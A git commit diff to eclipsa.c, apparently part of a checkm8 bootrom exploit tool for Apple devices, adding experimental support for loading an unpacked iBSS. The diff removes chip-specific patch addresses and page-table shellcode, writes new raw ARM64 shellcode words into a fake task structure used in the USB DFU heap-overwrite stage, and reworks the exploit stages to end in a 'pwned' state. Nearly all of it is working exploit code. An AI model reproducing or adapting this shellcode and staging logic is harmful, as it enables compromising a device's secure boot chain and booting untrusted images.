7a0b42b3427cfebdd5688aa73c41e5fbaf3c103f
exploit3dguy <51859413+exploit3dguy@users.noreply.github.com>
2021-02-24 22:08:37 +0100

    experimental support for loading unpacked iBSS

--- eclipsa.c
+++ eclipsa.c
@@ -16,27 +16,8 @@
 #include <IOKit/IOCFPlugIn.h>
 #include <IOKit/usb/IOUSBLib.h>
 
-#if CPID == 0x7000
-#	define SYNOPSYS_ROUTINE_ADDR (0x100005530)
-#	define ARCH_TASK_TRAMP_ADDR (0x10000D988)
-#	define IO_BUFFER_ADDR (0x18010D300)
-#	define SRTG "iBoot-1992.0.0.1.19"
-#	define PATCH_ADDR_0 (0x1000078B4)
-#	define PATCH_ADDR_1 (0x1000078C0)
-#	define PATCH_ADDR_2 (0x1000078E4)
-#	define PATCH_ADDR_3 (0x100007BAC)
-#	define PATCH_ADDR_4 (0x180088917 + strlen(SRTG))
-#elif CPID == 0x7001
-#	define SYNOPSYS_ROUTINE_ADDR (0x1000064FC)
-#	define ARCH_TASK_TRAMP_ADDR (0x100010988)
-#	define IO_BUFFER_ADDR (0x18010D500)
-#	define SRTG "iBoot-1991.0.0.2.16"
-#	define PATCH_ADDR_0 (0x10000A714)
-#	define PATCH_ADDR_1 (0x10000A720)
-#	define PATCH_ADDR_2 (0x10000A744)
-#	define PATCH_ADDR_3 (0x10000AA08)
-#	define PATCH_ADDR_4 (0x180088E97 + strlen(SRTG))
-#elif CPID == 0x8000 || CPID == 0x8003
+
+#if CPID == 0x8000 || CPID == 0x8003
 #	define SYNOPSYS_ROUTINE_ADDR (0x100006718)
 #	define VROM_PAGE_TABLE_ADDR (0x1800C8400)
 #	define ARCH_TASK_TRAMP_ADDR (0x10000D998)
@@ -46,11 +27,6 @@
 #	else
 #		define SRTG "iBoot-2234.0.0.2.22"
 #	endif
-#	define PATCH_ADDR_0 (0x100007924)
-#	define PATCH_ADDR_1 (0x10000792C)
-#	define PATCH_ADDR_2 (0x100007958)
-#	define PATCH_ADDR_3 (0x100007C9C)
-#	define PATCH_ADDR_4 (0x1800879A7 + strlen(SRTG))
 #endif
 
 #define MAGIC (0xB4)
@@ -63,18 +39,10 @@
 #define DFU_MODE_PID (0x1227)
 #define DFU_STATE_MANIFEST (7)
 #define TASK_STACK_MIN (0x4000)
-#define PATCH_VAL_0 (0xD503201F) /* nop */
-#define PATCH_VAL_1 (0xD503201F) /* nop */
-#define PATCH_VAL_2 (0xD503201F) /* nop */
-#define PATCH_VAL_3 (0xD503201F) /* nop */
 #define EP0_MAX_PACKET_SZ (0x40)
 #define DFU_HEAP_BLOCK_SZ (0x40)
 #define DFU_FILE_SUFFIX_LEN (16)
 #define TASK_MAGIC_1 (0x74736B32)
-#define PATCH_VAL_4_0 (0x4E575020)
-#define PATCH_VAL_4_1 (0x655B3A44)
-#define PATCH_VAL_4_2 (0x70696C63)
-#define PATCH_VAL_4_3 (0x005D6173)
 #define DFU_STATE_MANIFEST_SYNC (6)
 #define TASK_STACK_MAGIC (0x7374616B)
 #define DFU_STATE_MANIFEST_WAIT_RESET (8)
@@ -326,63 +294,23 @@ checkm8_stage_patch(const handle_t *handle) {
 	overwrite.fake_task.magic_1 = TASK_MAGIC_1;
 	strcpy(overwrite.fake_task.name, "eclipsa");
 	shc = overwrite.fake_task.arch.shc;
-#if CPID == 0x8000 || CPID == 0x8003
 	overwrite.fake_task.arg = VROM_PAGE_TABLE_ADDR;
-	*shc++ = 0xD50343DF; /* msr DAIFSet, #(DAIFSC_IRQF | DAIFSC_FIQF) */
-	*shc++ = 0xD5033FDF; /* isb */
-	*shc++ = 0xF940000A; /* ldr x10, [x0] */
-	*shc++ = 0xB24B054A; /* orr x10, x10, #(ARM_TTE_BLOCK_PNX | ARM_TTE_BLOCK_NX) */
-	*shc++ = 0x9278F94A; /* bic x10, x10, #ARM_TTE_BLOCK_AP_PRIV */
-	*shc++ = 0xF900000A; /* str x10, [x0] */
-	*shc++ = 0xD5033F9F; /* dsb sy */
-	*shc++ = 0xD50E871F; /* tlbi alle3 */
-	*shc++ = 0xD5033F9F; /* dsb sy */
-	*shc++ = 0xD5033FDF; /* isb */
-	*shc++ = 0x10000368; /* adr x8, #0x6C */
-#else
-	*shc++ = 0x10000248; /* adr x8, #0x48 */
-#endif
-	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
-	*shc++ = 0xB9000269; /* str w9, [x19] */
-	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
-	*shc++ = 0xB9000289; /* str w9, [x20] */
-	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
-	*shc++ = 0xB90002A9; /* str w9, [x21] */
-	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
-	*shc++ = 0xB90002C9; /* str w9, [x22] */
-	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
-	*shc++ = 0xB80046E9; /* str w9, [x23], #4 */
-	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
-	*shc++ = 0xB80046E9; /* str w9, [x23], #4 */
-	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
-	*shc++ = 0xB80046E9; /* str w9, [x23], #4 */
-	*shc++ = 0xB9400109; /* ldr w9, [x8] */
-	*shc++ = 0xB90002E9; /* str w9, [x23] */
-#if CPID == 0x8000 || CPID == 0x8003
-	*shc++ = 0x9249F54A; /* bic x10, x10, #(ARM_TTE_BLOCK_PNX | ARM_TTE_BLOCK_NX) */
-	*shc++ = 0xB279014A; /* orr x10, x10, #ARM_TTE_BLOCK_AP_PRIV */
-	*shc++ = 0xF900000A; /* str x10, [x0] */
-	*shc++ = 0xD5033F9F; /* dsb sy */
-	*shc++ = 0xD50E871F; /* tlbi alle3 */
-	*shc++ = 0xD5033F9F; /* dsb sy */
-	*shc++ = 0xD5033FDF; /* isb */
-	*shc++ = 0xD50343FF; /* msr DAIFClr, #(DAIFSC_IRQF | DAIFSC_FIQF) */
-	*shc++ = 0xD5033FDF; /* isb */
-#endif
-	*shc++ = 0xD65F03C0; /* ret */
-	*shc++ = PATCH_VAL_0;
-	*shc++ = PATCH_VAL_1;
-	*shc++ = PATCH_VAL_2;
-	*shc++ = PATCH_VAL_3;
-	*shc++ = PATCH_VAL_4_0;
-	*shc++ = PATCH_VAL_4_1;
-	*shc++ = PATCH_VAL_4_2;
-	*shc = PATCH_VAL_4_3;
-	overwrite.fake_task.arch.x[19] = PATCH_ADDR_0;
-	overwrite.fake_task.arch.x[20] = PATCH_ADDR_1;
-	overwrite.fake_task.arch.x[21] = PATCH_ADDR_2;
-	overwrite.fake_task.arch.x[22] = PATCH_ADDR_3;
-	overwrite.fake_task.arch.x[23] = PATCH_ADDR_4;
+	
+	// shellcode
+	
+        *shc++ = 0x580000C5;
+	*shc++ = 0x180000E6;
+	*shc++ = 0xB90000A6;
+	*shc++ = 0xD65F03C0;
+	*shc++ = 0x580000C4;
+	*shc++ = 0xD61F0080;
+	*shc++ = 0x800C2F58;
+	*shc++ = 0x01;
+	*shc++ = 0x8010DA40;
+	*shc++ = 0xD503201F;
+	*shc++ = 0x78C;
+	*shc++ = 0x01;
+	
 	overwrite.fake_task.magic_0 = TASK_STACK_MAGIC;
 	overwrite.fake_task.arch.lr = ARCH_TASK_TRAMP_ADDR;
 	overwrite.fake_task.stack_len = overwrite.synopsys_task.stack_len;
@@ -416,31 +344,26 @@ attached_usb_handle(void *refcon, io_iterator_t iter) {
 					ret = checkm8_stage_setup(handle);
 					printf("Stage: SETUP");
 					handle->stage = STAGE_PATCH;
-				} else if(handle->stage == STAGE_PATCH) {
+				} else {
 					ret = checkm8_stage_patch(handle);
 					printf("Stage: PATCH");
-					handle->stage = STAGE_ABORT;
-				} else {
-					ret = send_usb_device_request_async(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_CLR_STATUS, 0, 0, NULL, 0, NULL);
-					printf("Stage: ABORT");
+					handle->stage = STAGE_PWNED;
 				}
 				printf(", ret: 0x%" PRIX32 "\n", ret);
-				if(((*handle->device)->USBDeviceReEnumerate(handle->device, 0) != KERN_SUCCESS || ret != KERN_SUCCESS) && handle->stage != STAGE_ABORT) {
+				if((*handle->device)->USBDeviceReEnumerate(handle->device, 0) != KERN_SUCCESS || ret != KERN_SUCCESS) {
 					handle->stage = STAGE_RESET;
 				}
 				close_usb_device(handle);
+				if(handle->stage == STAGE_PWNED) {
+					
+					CFRunLoopStop(CFRunLoopGetCurrent());
+				}
 			}
 		} else {
 			IOObjectRelease(serv);
-			if(pwned) {
-				handle->stage = STAGE_PWNED;
-				CFRunLoopStop(CFRunLoopGetCurrent());
-				puts("Now you can boot untrusted images.");
-				break;
-			}
+		}
 		}
 	}
-}
 
 static void
 eclipsa(handle_t *handle) {
